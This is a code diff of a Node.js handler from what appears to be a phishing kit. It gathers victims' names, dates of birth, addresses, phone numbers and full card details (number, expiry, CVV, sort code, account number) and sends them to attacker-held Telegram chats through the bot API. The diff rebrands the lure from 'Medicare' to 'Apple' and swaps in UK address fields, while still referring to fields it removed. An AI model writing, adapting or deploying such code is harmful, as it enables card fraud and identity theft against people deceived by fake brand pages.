@@ -8,17 +8,17 @@ const sendRes = async (req, res) => {
     lastName,
     telephone,
     addy1,
+    addy2,
+    town,
+    pcode,
     dob,
-    city,
-    state,
-    zip,
-    ccname,
     ccnum,
     ccexpmonth,
     ccexpyear,
     cvv,
     scode,
     accno,
+    ccname,
     bin,
     ip,
     userAgent,
@@ -41,7 +41,7 @@ const sendRes = async (req, res) => {
   }
 
   const binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
-  var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${
+  var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${city}\nTown: ${town}\nPost Code: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${
     scode ? scode : null
   }\nAccount Number: ${
     accno ? accno : null
@@ -66,7 +66,7 @@ const sendRes = async (req, res) => {
         `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
         {
           chat_id: 680379375,
-          text: `Medicare ${telegramId}:\n${originalText}`,
+          text: `Apple ${telegramId}:\n${originalText}`,
           parse_mode: "Markdown",
         }
       )
@@ -78,7 +78,7 @@ const sendRes = async (req, res) => {
         `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
         {
           chat_id: telegramId,
-          text: `Medicare:\n${originalText}`,
+          text: `Apple:\n${originalText}`,
           parse_mode: "Markdown",
         }
       )
